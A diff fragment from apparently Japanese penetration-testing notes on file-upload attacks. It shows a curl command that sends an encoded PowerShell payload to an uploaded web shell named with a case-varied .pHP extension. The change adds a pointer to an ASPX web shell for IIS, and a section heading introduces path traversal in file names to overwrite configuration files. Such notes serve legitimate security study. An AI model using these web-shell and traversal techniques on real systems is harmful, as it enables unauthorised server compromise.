@@ -121,7 +121,8 @@ echo $EncodedText
 ```bash
 # アップロードしたWebシェル経由でエンコードされたワンライナーを実行
 curl -s "http://<TARGET_IP>/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64_PAYLOAD>"
-```
+```  
+Windows IIS server --> /usr/share/webshells/aspx/cmdasp.aspx  
 
 ### 3.2 実行不可能なファイルの悪用（パストラバーサル併用）
 ファイルが直接実行できない、またはWebルート外に保存される場合、ファイル名に相対パス（`../`）を注入して重要設定ファイルを上書きします。
